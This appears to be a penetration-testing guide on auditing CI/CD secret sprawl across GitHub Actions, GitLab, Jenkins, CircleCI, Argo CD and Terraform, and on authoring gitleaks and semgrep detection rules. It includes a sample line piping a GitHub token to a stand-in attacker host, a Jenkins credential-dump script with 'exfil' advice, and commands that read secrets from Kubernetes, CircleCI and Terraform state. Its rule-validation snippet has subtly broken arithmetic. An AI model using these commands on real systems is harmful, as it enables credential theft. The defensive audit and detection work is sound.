# CI/CD Secret Sprawl Audit and SAST Rule Authoring Deep Dive

> Deep-dive companion to `skills/secret-management-attack/SKILL.md` and the two sibling guides (`secret-management-attack-playbook.md`, `vault-and-cloud-kms-attack-playbook.md`).
>
> Audience: pentesters and red-team engineers who already understand the breadth playbook (scope, scan, triage, exploit, pivot, report) and the platform playbook (Vault, AWS KMS, GCP KMS, Azure Key Vault). This guide zooms in on the two areas where the prior playbooks are deliberately thin:
>
> 1. **CI/CD secret sprawl audit** — how to enumerate, extract, and pivot through the secret inventory embedded in GitHub Actions, GitLab CI, Jenkins, CircleCI, Argo CD, Tekton, and Terraform Cloud across dozens of repositories and pipelines.
> 2. **SAST rule authoring** — how to write, tune, and validate custom semgrep / bearer / gitleaks rules for proprietary token formats that off-the-shelf scanners miss.
>
> The parent playbook answers "I have a foothold; where are the secrets?" This guide answers the next two questions: "How do I audit the entire CI/CD sprawl, not just one pipeline?" and "How do I write a scanner rule for the client's bespoke token format that no off-the-shelf tool knows about?"

---

## 1. Why CI/CD Sprawl Deserves Its Own Guide

The single biggest change in secret-management attack surface between 2020 and 2026 is sprawl. A typical enterprise now has:

- **Hundreds to thousands of repositories**, each with its own `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, or `.circleci/config.yml`.
- **Multiple CI providers in parallel** — GitHub Actions for open-source, GitLab CI for internal, Jenkins for legacy, Argo CD for Kubernetes deploys, CircleCI for mobile.
- **Terraform Cloud / Atlantis / Spacelift** workflows storing cloud credentials as workspace variables.
- **Secrets distributed across at least five stores**: GitHub Actions `secrets.*`, GitLab CI Variables (masked and unmasked), Jenkins Credentials, CircleCI Contexts, and the cloud-native secret managers (AWS Secrets Manager, GCP Secret Manager, Azure Key Vault) the above reference.

The offensive consequence: a single leaked GitHub Actions secret in a forgotten repository from 2022 can still deploy to production in 2026. The defensive consequence: rotation programs that cover only the primary CI provider leave 30-50% of the actual secret inventory untouched.

This guide provides the methodology, tooling, and rule-writing discipline to audit the full sprawl in a defensible, OPSEC-aware way.

---

## 2. Overview — What This Guide Covers

| Section | Focus |
|---------|-------|
| 3 | CI/CD inventory enumeration — every provider, every repo, every workflow file |
| 4 | GitHub Actions secret audit depth — workflow parsing, `secrets.*` graph, runner abuse, environment scoping |
| 5 | GitLab CI secret audit depth — masked vs unmasked variables, protected branches, `script:` echo leaks |
| 6 | Jenkins credentials audit — folder vs global credentials, binding leaks, `withCredentials` misuse |
| 7 | CircleCI contexts and Argo CD / Tekton / Terraform Cloud / Spacelift |
| 8 | Terraform state file secret extraction (`.tfstate` and `.tfstate.backup`) |
| 9 | gitleaks custom rule authoring — syntax, allowlists, entropy tuning, validation |
| 10 | semgrep custom rule authoring — pattern-either, metavariable-regex, dataflow sources and sinks |
| 11 | bearer custom rule authoring — pattern syntax, flow tracking, recipe format |
| 12 | Validation methodology — planting secrets, measuring precision and recall, false-positive tuning |
| 13 | OPSEC for CI/CD audit — what triggers provider alerting, what does not |
| 14 | Report assembly — CI/CD sprawl heat map, prioritized remediation |
| 15 | Real-world references and further reading |

---

## 3. CI/CD Inventory Enumeration

The first failure in most CI/CD audits is under-enumeration. Pentesters scan one repo, find no findings, and declare the surface clean — when the actual surface spans 400 repositories across three providers. Inventory first.

### 3.1 GitHub Actions Inventory (Enterprise / Org-Level)

```bash
# List every repository in the org (requires GH_TOKEN with read:org scope)
# REPLACE_WITH_YOUR_GH_TOKEN below — never hardcode
export GH_TOKEN=REPLACE_WITH_YOUR_GH_TOKEN

# Enumerate repos
gh repo list REPLACE_WITH_YOUR_ORG --limit 1000 --json nameWithOwner,visibility,defaultBranchRef \
  --template '{{range .}}{{.nameWithOwner}},{{.visibility}},{{.defaultBranchRef.name}}{{"\n"}}{{end}}' \
  > gh_repos.tsv

# For each repo, check whether it has any workflow files
while IFS=, read -r repo vis branch; do
  workflows=$(gh api "repos/${repo}/contents/.github/workflows" --jq '.[].name' 2>/dev/null | tr '\n' ' ')
  if [ -n "$workflows" ]; then
    echo "${repo}|${vis}|${branch}|${workflows}"
  fi
done < gh_repos.tsv > gh_repos_with_workflows.tsv

# Summary
echo "Total repos: $(wc -l < gh_repos.tsv)"
echo "Repos with workflows: $(wc -l < gh_repos_with_workflows.tsv)"
```

### 3.2 GitLab CI Inventory

```bash
# List every project in the group (requires GL_TOKEN with api scope)
export GL_TOKEN=REPLACE_WITH_YOUR_GITLAB_TOKEN
GITLAB_HOST=gitlab.example.com

# Enumerate projects
curl --silent --header "PRIVATE-TOKEN: ${GL_TOKEN}" \
  "https://${GITLAB_HOST}/api/v4/groups/REPLACE_WITH_YOUR_GROUP/projects?per_page=100&include_subgroups=true" \
  | jq -r '.[] | [.path_with_namespace, .visibility, .default_branch] | @tsv' \
  > gl_projects.tsv

# For each project, fetch .gitlab-ci.yml
while IFS=$'\t' read -r project vis branch; do
  project_encoded=$(echo "$project" | sed 's/\//%2F/g')
  exists=$(curl --silent -o /dev/null -w "%{http_code}" \
    --header "PRIVATE-TOKEN: ${GL_TOKEN}" \
    "https://${GITLAB_HOST}/api/v4/projects/${project_encoded}/repository/files/.gitlab-ci.yml/raw?ref=${branch}")
  if [ "$exists" = "200" ]; then
    echo "${project}|${branch}"
  fi
done < gl_projects.tsv > gl_projects_with_ci.tsv
```

### 3.3 Jenkins Inventory

```bash
# Jenkins script console approach (requires Jenkins admin credentials)
# REPLACE_WITH_YOUR_JENKINS_USER and REPLACE_WITH_YOUR_JENKINS_TOKEN
JENKINS_URL=https://jenkins.example.com
JENKINS_USER=REPLACE_WITH_YOUR_JENKINS_USER
JENKINS_TOKEN=REPLACE_WITH_YOUR_JENKINS_TOKEN

# List every job recursively (folders included)
curl --silent --user "${JENKINS_USER}:${JENKINS_TOKEN}" \
  "${JENKINS_URL}/api/json?tree=jobs[name,url,color,jobs[name,url,color,jobs[name,url,color]]]" \
  | jq -r '
    def walk(prefix):
      . as $root |
      if .jobs then
        .jobs[] |
        .name as $n |
        "\($root | if . == null then "" else . + "/" end)\($n)" as $full |
        $full,
        ($full | walk($full))
      else empty end;
    walk(null)
  ' > jenkins_jobs.txt

# Note: this returns folders + leaf jobs. Filter by color (blue=ok, red=failing, notbuilt=disabled)
```

### 3.4 CircleCI Inventory

```bash
# CircleCI v2 API (requires CCI_TOKEN with view-api scope)
export CCI_TOKEN=REPLACE_WITH_YOUR_CIRCLECI_TOKEN

# List pipelines for the org
curl --silent --header "Circle-Token: ${CCI_TOKEN}" \
  "https://circleci.com/api/v2/pipeline?org-slug=gh/REPLACE_WITH_YOUR_ORG" \
  | jq -r '.items[].project_slug'

# List contexts (the secret groups)
curl --silent --header "Circle-Token: ${CCI_TOKEN}" \
  "https://circleci.com/api/v2/context?owner-slug=gh/REPLACE_WITH_YOUR_ORG" \
  | jq -r '.items[].id as $cid | "\($id) \(.items[] | .name)"' 2>/dev/null
# Note: the above lists context IDs; actual env var values are not returned by list endpoint.
# Reading values requires the per-context env var endpoint (documented in §7).
```

### 3.5 Inventory Output Schema

Standardize on this TSV format so downstream tooling can consume all providers uniformly:

```bash
cat <<EOF > inventory_schema.tsv
provider	repo_or_project	workflow_file	branch	last_commit_at	owner_team	notes
github	client/monorepo	.github/workflows/deploy.yml	main	2026-05-14	platform-team	uses secrets.DEPLOY_KEY
gitlab	client/api	.gitlab-ci.yml	main	2026-04-02	backend-team	uses $PROD_DB_PASSWORD variable
jenkins	client/release	Jenkinsfile	main	2026-03-18	release-eng	uses withCredentials binding
circleci	client/mobile	.circleci/config.yml	main	2026-05-30	mobile-team	uses context deploy-keys
EOF
```

The goal of inventory is not just to enumerate files but to produce a **heat map**: which repos have workflows, which workflows reference secrets, which secrets are referenced by multiple workflows (cross-cutting blast radius).

---

## 4. GitHub Actions Secret Audit Depth

### 4.1 Workflow Parsing — The `secrets.*` Reference Graph

The core technique is parsing every workflow YAML, extracting every `${{ secrets.X }}` reference, and building a reference graph: which secrets are used in which workflows, in which steps, by which actions.

```bash
# Pull every workflow file from every repo with workflows (assumes §3.1 output)
mkdir -p workflows
while IFS='|' read -r repo vis branch workflows; do
  for wf in $workflows; do
    out="workflows/${repo//\//_}_${wf//\//_}"
    gh api "repos/${repo}/contents/.github/workflows/${wf}?ref=${branch}" \
      --jq '.content' | base64 -d > "$out" 2>/dev/null
  done
done < gh_repos_with_workflows.tsv

# Extract every secrets.X reference
grep -rhoE 'secrets\.[A-Z_]+' workflows/ | sort -u > all_secret_refs.txt

# Per-workflow reference map
for wf in workflows/*; do
  refs=$(grep -oE 'secrets\.[A-Z_]+' "$wf" | sort -u | tr '\n' ' ')
  echo "${wf}|${refs}"
done > workflow_secret_map.tsv
```

### 4.2 Identifying High-Risk Patterns

```bash
# Pattern 1: pull_request_target with secrets — the canonical exfil vector (see SKILL.md Exercise 5)
grep -lE 'pull_request_target' workflows/*.yml | while read wf; do
  if grep -qE 'secrets\.' "$wf"; then
    echo "HIGH RISK: $wf uses pull_request_target AND secrets"
  fi
done

# Pattern 2: issue_comment or issues trigger with secrets (attacker-controlled PR review trigger)
grep -lE 'on:.*(issue_comment|issues)' workflows/*.yml | while read wf; do
  if grep -qE 'secrets\.' "$wf"; then
    echo "HIGH RISK: $wf uses issue trigger AND secrets"
  fi
done

# Pattern 3: self-hosted runner on a public repo (reverse shell exfil via runner)
grep -lE 'runs-on: \[?self-hosted' workflows/*.yml | while read wf; do
  repo=$(echo "$wf" | sed 's|workflows/||;s|_.*||')
  visibility=$(grep "^${repo//\//_}" gh_repos_with_workflows.tsv | cut -d'|' -f2)
  if [ "$visibility" = "public" ]; then
    echo "HIGH RISK: public repo $repo uses self-hosted runner"
  fi
done

# Pattern 4: untrusted inputs flowing into shell (script injection via PR title/body)
grep -lE 'run:.*\$\{\{ *(github\.event\.(pull_request|issue|comment)|inputs\.)' workflows/*.yml
```

### 4.3 Environment Scoping Audit

GitHub Actions `environment` protection rules are how mature teams limit secret blast radius. Audit which workflows use environments vs which use repo-level secrets:

```bash
# Workflows using environments (good — secrets are scoped)
grep -lE 'environment:' workflows/*.yml | wc -l

# Workflows using repo-level secrets without environment scoping (bad — secrets available to every job)
for wf in workflows/*.yml; do
  if grep -qE 'secrets\.' "$wf" && ! grep -qE 'environment:' "$wf"; then
    echo "NO-ENV: $wf uses secrets without environment scoping"
  fi
done
```

### 4.4 Runner State and Cache Exfiltration

```bash
# Self-hosted runners often persist state between jobs — check for leaked secrets in:
# - ~/.docker/config.json (registry creds from previous jobs)
# - /tmp/actions-runner/_work/ (working directory state)
# - ~/.cache/ (pip, npm, go module caches may include secret-bearing config)

# From a foothold on a self-hosted runner host:
find / -name 'config.json' -path '*docker*' 2>/dev/null | head -5
find /home -name '.npmrc' 2>/dev/null
find /tmp -name '.env' 2>/dev/null

# Runner cache: GitHub Actions cache is keyed by branch + scope
# Cache poisoning is a separate attack — documented in skills/supply-chain-security
```

### 4.5 `pull_request_target` Exploit Variants

Beyond the canonical exfil via postinstall (covered in `SKILL.md` Exercise 5 and `payloads.md` §11.1), there are several subtler variants:

```yaml
# Variant 1: checkout with persist-credentials (default true) leaks the auto-generated
# GITHUB_TOKEN to the attacker-controlled fork ref
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}
    persist-credentials: true   # this is the default — the GITHUB_TOKEN is written to .git/config
- run: |
    # attacker's package.json postinstall reads .git/config and exfils the token
    cat .git/config | curl -d @- https://attacker.example/

# Variant 2: workflow_dispatch with attacker-controlled inputs
on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'URL to deploy'
        required: true
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: curl "${{ inputs.target_url }}"  # SSRF + secret leak via URL parameter
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

Document each variant with: workflow YAML snippet, attack PR diff, blast radius (which secrets are reachable), and remediation (use `pull_request`, gate with label, never use untrusted input in shell).

---

## 5. GitLab CI Secret Audit Depth

### 5.1 Variable Taxonomy

GitLab CI variables come in four flavors with different exposure characteristics:

| Flavor | Where Defined | Masked? | Protected? | Visible in Job Logs? |
|--------|---------------|---------|------------|----------------------|
| **Project variable** | Settings → CI/CD → Variables | Optional | Optional | If unmasked: yes |
| **Group variable** | Group → Settings → CI/CD | Optional | Optional | If unmasked: yes |
| **Instance variable** | Admin → CI/CD → Variables | Optional | Optional | If unmasked: yes |
| **`.gitlab-ci.yml` defined** | In the YAML itself | No | No | Yes |

The audit goal: enumerate every variable of every flavor, distinguish masked from unmasked, identify which are protected (only available on protected branches), and find any unmasked variable that holds a real secret.

### 5.2 Enumerating Variables via API

```bash
# Project-level variables (requires Maintainer or higher role)
project_encoded=$(echo "client/monorepo" | sed 's/\//%2F/g')
curl --silent --header "PRIVATE-TOKEN: ${GL_TOKEN}" \
  "https://${GITLAB_HOST}/api/v4/projects/${project_encoded}/variables" \
  | jq -r '.[] | [.key, .masked, .protected, .environment_scope] | @tsv'

# Group-level variables
group_encoded=$(echo "client" | sed 's/\//%2F/g')
curl --silent --header "PRIVATE-TOKEN: ${GL_TOKEN}" \
  "https://${GITLAB_HOST}/api/v4/groups/${group_encoded}/variables" \
  | jq -r '.[] | [.key, .masked, .protected, .environment_scope] | @tsv'

# Instance-level variables (admin only)
curl --silent --header "PRIVATE-TOKEN: ${GL_TOKEN}" \
  "https://${GITLAB_HOST}/api/v4/admin/ci/variables" \
  | jq -r '.[] | [.key, .masked, .protected] | @tsv'
```

### 5.3 The `script:` Echo Leak

The most common GitLab CI secret leak is the `script:` echo leak: a CI variable used in a script step gets logged because the shell expansion appears in the job log before the masking kicks in (or because the variable is unmasked).

```yaml
# VULNERABLE: unmasked variable echoes to log
deploy:
  script:
    - echo "Deploying with token $DEPLOY_TOKEN"   # logs the full token value
    - ./deploy.sh "$DEPLOY_TOKEN"
```

Detection: parse every `.gitlab-ci.yml` for variable references in `script:` blocks and flag any that are passed to `echo`, `print`, `cat`, or used in error messages.

```bash
# Find every .gitlab-ci.yml that references variables in echo/print statements
grep -rnE '(echo|print|printf|cat).*\$\{?[A-Z_]+\}?' .gitlab-ci.ymls/ \
  | grep -vE '#.*echo' \
  > echo_leak_candidates.txt
```

### 5.4 Protected Branch Audit

A "protected" variable is only available on protected branches (typically `main`, `release/*`). A common misconfiguration: a workflow that runs on a feature branch but expects `PROD_DEPLOY_KEY` (a protected variable) — the variable will be empty, the deploy will fail, and developers will "fix" it by removing the protection flag, exposing the secret to every branch.

```bash
# Find workflows that reference PROD_* variables but run on non-protected branches
for yml in .gitlab-ci.ymls/*.yml; do
  if grep -qE '\$\{?PROD_' "$yml"; then
    rules=$(grep -E '^\s*-\s*if:' "$yml")
    if ! echo "$rules" | grep -qE 'protected|ref == (main|master|release)'; then
      echo "PROD-VAR-WITHOUT-PROTECTION: $yml"
    fi
  fi
done
```

---

## 6. Jenkins Credentials Audit

### 6.1 Credential Store Taxonomy

Jenkins stores credentials in three scopes:

1. **System** (Jenkins-wide, manageable by admins)
2. **Global** (default; accessible by any job)
3. **Folder** (scoped to a specific folder/job hierarchy)

The audit goal: enumerate credentials at every scope, identify global-scope credentials that should be folder-scoped, and find jobs that bind credentials in unsafe ways.

### 6.2 Enumerating Credentials via API

```bash
# List every credential in every store
# This requires Credentials plugin and read access to /credentials/
curl --silent --user "${JENKINS_USER}:${JENKINS_TOKEN}" \
  "${JENKINS_URL}/credentials/store/system/api/json?tree=domains[name,credentials[id,description,scope]]" \
  | jq -r '.domains[] | .name as $domain | .credentials[] | "\($domain)\t\(.id)\t\(.scope)\t\(.description)"'

# Folder-scoped credentials
for folder in $(grep -E '/$' jenkins_jobs.txt); do
  folder_url="${JENKINS_URL}/job/${folder}/credentials/store/folder"
  curl --silent --user "${JENKINS_USER}:${JENKINS_TOKEN}" \
    "${folder_url}/api/json?tree=domains[name,credentials[id,scope]]" \
    | jq -r --arg f "$folder" '.domains[] | .name as $d | .credentials[] | "\($f)\t\($d)\t\(.id)\t\(.scope)"'
done
```

### 6.3 `withCredentials` Binding Audit

The `withCredentials` binding is how Jenkins exposes a credential to a build step. Misuse patterns:

```groovy
// VULNERABLE: credential written to a file that gets archived as a build artifact
withCredentials([usernamePassword(credentialsId: 'prod-db',
                                 usernameVariable: 'DB_USER',
                                 passwordVariable: 'DB_PASS')]) {
  sh '''
    echo "${DB_USER}:${DB_PASS}" > .ci/env   // ← archived as artifact
    ./deploy.sh
  '''
}

// VULNERABLE: credential echoed to log
withCredentials([string(credentialsId: 'deploy-token', variable: 'TOKEN')]) {
  sh "echo TOKEN=$TOKEN"   // ← prints to log
}

// VULNERABLE: credential passed as command-line argument (visible in process list)
withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
  sh "./tool --api-key ${API_KEY}"   // ← ps aux reveals it to co-tenant processes
}
```

Detection: parse every `Jenkinsfile` for `withCredentials` and audit what the bound variables are used for. Flag any of:

- `echo $VAR`
- `> file` (write to file that may be archived)
- `--flag $VAR` (process argument — visible to co-tenants)
- `print $VAR` (any language's print)

```bash
# Find Jenkinsfiles with suspect withCredentials usage
grep -rnE 'withCredentials' Jenkinsfiles/ | while read line; do
  file=$(echo "$line" | cut -d: -f1)
  if grep -qE '(echo|print|>).*\$\{?[A-Z_]+\}?' "$file"; then
    echo "SUSPECT: $file — withCredentials + echo/print/write"
  fi
done
```

### 6.4 Jenkins Script Console (Admin Only)

If you have admin access (e.g., Jenkins admin credentials harvested from a foothold), the Script Console grants arbitrary Groovy execution — full host takeover.

```groovy
// Dump every credential in every store
import com.cloudbees.plugins.credentials.CredentialsProvider
import jenkins.model.Jenkins

Jenkins.get().allItems().each { item ->
  CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    item
  ).each { cred ->
    println "${item.fullName} | ${cred.id} | ${cred.description}"
  }
}
```

> OPSEC note: Script Console usage is logged in `jenkins.log` and audit plugins (Audit Trail, etc.) record every script. Treat as a one-shot escalation — use, exfil, then move on.

---

## 7. CircleCI, Argo CD, Tekton, Terraform Cloud, Spacelift

### 7.1 CircleCI Contexts

```bash
# List every context (the secret groups)
curl --silent --header "Circle-Token: ${CCI_TOKEN}" \
  "https://circleci.com/api/v2/context?owner-slug=gh/REPLACE_WITH_YOUR_ORG" \
  | jq -r '.items[] | [.id, .name] | @tsv'

# List env vars in a context (returns names only — values are redacted in list)
context_id=REPLACE_WITH_CONTEXT_ID
curl --silent --header "Circle-Token: ${CCI_TOKEN}" \
  "https://circleci.com/api/v2/context/${context_id}/environment-variable" \
  | jq -r '.items[] | .name'

# Read a single env var value (returns the actual value — OPSEC-sensitive)
curl --silent --header "Circle-Token: ${CCI_TOKEN}" \
  "https://circleci.com/api/v2/context/${context_id}/environment-variable/DEPLOY_KEY" \
  | jq -r '.value'
```

### 7.2 Argo CD

Argo CD stores secrets for external clusters in its own secret store (typically Kubernetes secrets in the `argocd` namespace). The audit angle:

```bash
# From a foothold with kubectl access to the argocd namespace:
kubectl get secrets -n argocd
kubectl get secret argocd-secret -n argocd -o jsonpath='{.data.admin\.password}' | base64 -d
kubectl get secret argocd-tls -n argocd -o jsonpath='{.data.tls\.crt}' | base64 -d

# Repository credentials (for Git access)
kubectl get applications -A -o json | jq '.items[] | .spec.source.repoURL' | sort -u
kubectl get repocreds -A -o yaml   # cluster-wide Git credentials
kubectl get secrets -A -l argocd.argoproj.io/secret-type=repository
```

### 7.3 Tekton

Tekton stores secrets as Kubernetes secrets referenced by `Workspace` and `PipelineResource` definitions:

```bash
# Find every Tekton Pipeline that references a Secret
kubectl get pipelines -A -o json \
  | jq '.items[] | .metadata.namespace as $ns | .metadata.name as $name |
        .spec.tasks[]?.params[]? | select(.name == "secret-name") |
        "\($ns)/\($name) → \(.value)"'

# Find every ServiceAccount with a linked secret (Tekton SA-bound secrets)
kubectl get serviceaccounts -A -o json \
  | jq '.items[] | select(.secrets != null) | "\(.metadata.namespace)/\(.metadata.name) → \(.secrets[].name)"'
```

### 7.4 Terraform Cloud / Atlantis / Spacelift

These IaC automation tools store cloud credentials as workspace or organization variables.

```bash
# Terraform Cloud (TFC) workspaces and variables
# Requires TFC_TOKEN with api:read scope
export TFC_TOKEN=REPLACE_WITH_YOUR_TFC_TOKEN
TFC_ORG=REPLACE_WITH_YOUR_ORG

# List workspaces
curl --silent --header "Authorization: Bearer ${TFC_TOKEN}" \
  "https://app.terraform.io/api/v2/organizations/${TFC_ORG}/workspaces" \
  | jq -r '.data[] | [.id, .attributes.name] | @tsv'

# List variables per workspace (returns values only for non-sensitive vars)
workspace_id=REPLACE_WITH_WORKSPACE_ID
curl --silent --header "Authorization: Bearer ${TFC_TOKEN}" \
  "https://app.terraform.io/api/v2/workspaces/${workspace_id}/vars" \
  | jq -r '.data[] | [.attributes.key, .attributes.sensitive, .attributes.value] | @tsv'
```

For Atlantis and Spacelift, the secret store is typically the host Kubernetes cluster (Atlantis Helm values) or the cloud secret manager (Spacelift integrates with AWS Secrets Manager, GCP Secret Manager). The audit reduces to: enumerate the Atlantis deployment env vars + Spacelift integration config.

---

## 8. Terraform State File Secret Extraction

Terraform `.tfstate` files are an under-audited secret store. They contain the resolved values of every resource attribute — including `initial_root_password`, `password`, `access_key`, and `private_key` attributes that Terraform wrote down so it could track them across runs.

### 8.1 Finding `.tfstate` Files

```bash
# In every repo with Terraform code:
find . -name '*.tfstate' -o -name '*.tfstate.backup' 2>/dev/null > tfstate_files.txt

# In S3 backends (state is often in a shared bucket)
aws s3 ls --recursive s3://REPLACE_WITH_STATE_BUCKET/ | grep -E '\.tfstate'

# In Terraform Cloud — state is not directly accessible via API but is exposed via the
# "state versions" endpoint (requires workspace read access)
curl --silent --header "Authorization: Bearer ${TFC_TOKEN}" \
  "https://app.terraform.io/api/v2/workspaces/${workspace_id}/current-state-version" \
  | jq -r '.data.attributes."hosted-state-download-url"'
# Then fetch the URL — it's a pre-signed S3 link with the full state JSON
```

### 8.2 Extracting Secrets from `.tfstate`

```bash
# Common secret-bearing attribute names across providers
patterns='password|passwd|pwd|secret|token|api_key|access_key|private_key|client_secret|connection'

# Grep every tfstate file
while read tf; do
  echo "=== $tf ==="
  jq -r '.. | strings | select(test("'"$patterns"'"; "i")) | select(length > 8)' "$tf" \
    | sort -u | head -50
done < tfstate_files.txt

# Use gitleaks to scan tfstate files (gitleaks supports .tfstate natively)
gitleaks detect --source . --no-git --report-path tfstate_leaks.json \
  --log-opts='' --include-paths='\.tfstate$'
```

### 8.3 Provider-Specific Patterns

```bash
# AWS RDS master password — in state as .resources[].instances[].attributes.password
jq '.resources[]
    | select(.type == "aws_db_instance")
    | .instances[].attributes.password' *.tfstate

# Kubernetes secret data — base64-encoded in state
jq '.resources[]
    | select(.type == "kubernetes_secret")
    | .instances[].attributes.data' *.tfstate \
  | while read keyval; do
      echo "$keyval" | base64 -d 2>/dev/null
    done

# TLS private keys — stored in state when generated by terraform-tls provider
jq '.resources[]
    | select(.type == "tls_private_key")
    | .instances[].attributes.private_key_pem' *.tfstate

# GitHub tokens (when terraform manages github_team_membership with a token)
jq '.resources[]
    | select(.type == "github_token" or .type == "github_repository")
    | .instances[].attributes' *.tfstate
```

### 8.4 Defense and Audit Wrap-Up

The defense against `.tfstate` secret exposure is `sensitive = true` on every secret-bearing attribute, plus state encryption (introduced in Terraform 1.10+, but adoption is still low as of 2026). The audit checklist:

1. Every `.tfstate` and `.tfstate.backup` in scope is scanned.
2. Every S3 state bucket has block-public-access and default encryption enabled.
3. Every Terraform resource with a secret-bearing attribute marks it `sensitive = true`.
4. State is never committed to a repo (the most common leak pattern).

---

## 9. gitleaks Custom Rule Authoring

Off-the-shelf gitleaks detects ~100 well-known secret formats. It does not detect the client's proprietary token format — `client_api_key_abc123...`, internal service tokens, bespoke JWT signatures. Custom rules close the gap.

### 9.1 gitleaks Config File Structure

```json
{
  "title": "Client secret detection ruleset",
  "extend": "gitleaks",
  "rules": [
    {
      "id": "client-internal-api-key",
      "description": "Client internal API key (40-char base62, prefix cli_)",
      "regex": "cli_[A-Za-z0-9]{40}",
      "keywords": ["cli_"],
      "allowlist": {
        "regexes": [
          "cli_example|cli_test|cli_your_key|cli_placeholder",
          "cli_[A-Za-z0-9]{40}\\s*#.*placeholder",
          "canarytokens\\.com"
        ],
        "paths": ["test/", "docs/", "examples/", "README.md"]
      }
    },
    {
      "id": "client-jwt-es256",
      "description": "Client-issued ES256 JWT (header.thesis.payload)",
      "regex": "eyJ[A-Za-z0-9_-]{10}\\.eyJ[A-Za-z0-9_-]{10}\\.[A-Za-z0-9_-]{40,}",
      "keywords": ["eyJ"],
      "allowlist": {
        "regexes": ["eyJhbGciOiJub25lIn0"]
      }
    }
  ]
}
```

### 9.2 Anatomy of a gitleaks Rule

| Field | Purpose |
|-------|---------|
| `id` | Stable identifier used in the report |
| `description` | Human-readable purpose |
| `regex` | The actual match pattern (Go RE2 syntax — no backreferences) |
| `keywords` | Pre-filter — gitleaks only runs the `regex` on lines containing at least one keyword. Massively improves performance. |
| `allowlist.regexes` | Patterns that, if matched, suppress the finding |
| `allowlist.paths` | File globs to skip entirely |

### 9.3 Validation Methodology

```bash
# Plant 20 sample secrets (with the client's format) in a sandbox repo
mkdir -p validation && cd validation
for i in $(seq 1 20); do
  echo "client_api_key_$(head -c 40 /dev/urandom | base64 | tr -dc 'A-Za-z0-9')" \
    > "sample_${i}.txt"
done

# Add 20 false-positive canaries (should NOT match)
for i in $(seq 1 20); do
  echo "client_api_key_example" > "canary_${i}.txt"
  echo "client_api_key_test" >> "canary_${i}.txt"
done

# Run gitleaks with the custom ruleset
gitleaks detect --source . --config ../custom_gitleaks.json --no-git --report-path findings.json

# Compute precision and recall
true_positives=$(jq '. | length' findings.json)
false_negatives=20  # adjust based on manual review
precision=$(awk "BEGIN {printf \"%.1f\", ${true_positives} / (${true_positives} + 0) * 100}")
recall=$(awk "BEGIN {printf \"%.1f\", ${true_positives} / 20 * 100}")
echo "Precision: ${precision}%  Recall: ${recall}%"
```

Aim for >90% precision and >90% recall on the validation set. If precision is too low, tighten the `allowlist`. If recall is too low, the `regex` is too strict — relax it or add a second rule variant.

### 9.4 Entropy-Based Detection

When the token format is unknown (e.g., the client says "any 40-char high-entropy string near the word 'token'"), use entropy-based detection:

```json
{
  "id": "high-entropy-near-token",
  "description": "High-entropy string near the word 'token'",
  "regex": "token['\"]?\\s*[:=]\\s*['\"]([A-Za-z0-9+/=_-]{32,})['\"]",
  "keywords": ["token"],
  "entropy": 4.5,
  "allowlist": {
    "regexes": ["example|test|placeholder|REPLACE_WITH"]
  }
}
```

The `entropy` field (gitleaks 8.18+) filters matches by Shannon entropy of the captured group. A threshold of 4.5 is a good default — high enough to skip low-entropy placeholders, low enough to catch real secrets.

---

## 10. semgrep Custom Rule Authoring

semgrep is a more expressive SAST than gitleaks because it parses the AST (not just regex) and can express data-flow constraints. Use it when the secret format is contextual (e.g., "any string assigned to a variable named `db_password`").

### 10.1 semgrep Rule File Structure

```yaml
# custom_secrets.yml
rules:
  - id: client.db-password-assignment
    message: Database password assigned in source code
    languages: [python, javascript, typescript, go, java]
    severity: ERROR
    metadata:
      classification: secret
      cwe: "CWE-798: Use of Hard-coded Credentials"
      rotation_owner: db-team@
    patterns:
      - pattern-regex: '(?i)(db_password|database_password|DB_PASS)\s*[:=]\s*["'']([^"'']{8,})["'']'
      - pattern-not-regex: '(?i)(example|test|placeholder|REPLACE_WITH)'
```

### 10.2 Pattern Operators

| Operator | Purpose |
|----------|---------|
| `pattern` | AST-aware match (single pattern) |
| `pattern-regex` | Regex match (no AST) |
| `pattern-either` | Any of multiple patterns must match |
| `pattern-inside` | Match only inside another pattern's scope |
| `pattern-not-regex` | Suppress if a regex matches |
| `metavariable-regex` | Compare captured metavariables to regex |
| `metavariable-comparison` | Numeric comparison on captured metavariables |
| `focus-metavariable` | Highlight a specific metavariable in output |

### 10.3 Dataflow Tracking — Secret-to-Sink

The most valuable semgrep use is tracking secret flow from source (where it's read) to sink (where it's exposed):

```yaml
rules:
  - id: client.secret-to-console-log
    message: Secret value logged to console
    languages: [javascript, typescript]
    mode: taint
    pattern-sources:
      - pattern-either:
          - pattern-inside: |
              const $SECRET = process.env.SECRET
              ...
          - pattern-inside: |
              const {$SECRET} = req.body
              ...
    pattern-sinks:
      - patterns:
          - pattern: console.log($S)
          - pattern-either:
              - pattern-inside: |
                  function $F(..., $SECRET, ...) {
                    ...
                  }
    severity: ERROR
```

This finds any function parameter named `$SECRET` that flows into a `console.log()` call — a typical source of credential leakage in JS.

### 10.4 Cross-Language Examples

```yaml
# Python: requests with hardcoded Authorization header
rules:
  - id: client.python-hardcoded-auth-header
    languages: [python]
    patterns:
      - pattern: requests.$M(..., headers={"Authorization": "Bearer $T"}, ...)
      - pattern-not-regex: 'example|test|REPLACE_WITH'
    message: Hardcoded Bearer token in requests call

# Go: hardcoded AWS access key
rules:
  - id: client.go-hardcoded-aws-key
    languages: [go]
    patterns:
      - pattern: |
          creds := credentials.NewStaticCredentials("$KEY", "$SECRET", "")
      - pattern-not-regex: 'example|test|REPLACE_WITH'

# Java: hardcoded JDBC URL with password
rules:
  - id: client.java-hardcoded-jdbc
    languages: [java]
    patterns:
      - pattern-regex: 'jdbc:[a-z]+://[^\\s]+password=[^\\s"\'\\)]+'
      - pattern-not-regex: 'password=\\$\\{|password=REPLACE'
```

### 10.5 Running semgrep with Custom Rules

```bash
# Combine custom + registry rulesets
semgrep --config custom_secrets.yml \
        --config p/secret-detection \
        --config p/security-audit \
        . --json -o findings.json

# CI mode — fail the build on new findings (diff vs main)
semgrep --config custom_secrets.yml --error --diff-depth=1 $(git rev-parse --abbrev-ref HEAD)

# Output formats
semgrep --config custom_secrets.yml . --sarif -o findings.sarif  # for GitHub code scanning
